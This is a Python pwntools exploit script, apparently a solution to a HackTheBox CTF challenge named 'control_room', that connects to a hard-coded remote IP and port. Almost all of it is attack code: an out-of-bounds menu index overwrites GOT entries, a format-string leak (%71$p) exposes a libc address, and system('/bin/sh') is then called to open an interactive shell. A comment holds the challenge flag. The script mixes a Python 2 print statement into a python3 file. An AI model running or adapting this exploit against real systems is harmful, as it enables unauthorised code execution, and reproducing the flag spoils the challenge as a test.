#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 123 ./control_room
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./control_room')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '68.183.45.143'
port = int(args.PORT or 30438)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *user_edit+320
b *0x00000000004018bc
continue
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
libc = ELF('libc.so.6')
io.sendline(b"A"*0xff)
io.sendline(b"256")
io.sendlineafter("username: ",b"A"*0xfe)

def change_role(role):
    io.sendlineafter('[1-5]: ','5')
    io.sendlineafter('role: ',str(role))

def conf_engine(idx,arry1,arry2,option='y'):
    io.sendlineafter('[1-5]: ','1')
    io.sendlineafter('[0-3]: ',str(idx))
    io.sendlineafter('Thrust:',str(arry1))
    io.sendlineafter('ratio:',str(arry2))
    io.sendlineafter('> ',str(option))

change_role(1)

# conf_engine(-17,exe.plt['printf'],exe.plt['printf'])
conf_engine(-14,exe.plt['printf'],exe.plt['printf'])

conf_engine(-7,0x0000000000401710,exe.sym['main']) # user_register

io.sendlineafter('[1-5]: ','\x01')

io.sendlineafter("username: ",b"%71$p")

libc.address = int(io.recv(14),16)- libc.sym['__libc_start_main'] - 133+5
print hex(libc.address)

conf_engine(-14,libc.sym['system'],0)

io.sendlineafter('[1-5]: ','\x01')

io.sendlineafter("username: ",b"/bin/sh\x00")

# HTB{pr3p4r3_4_1mp4ct~~!}

io.interactive()

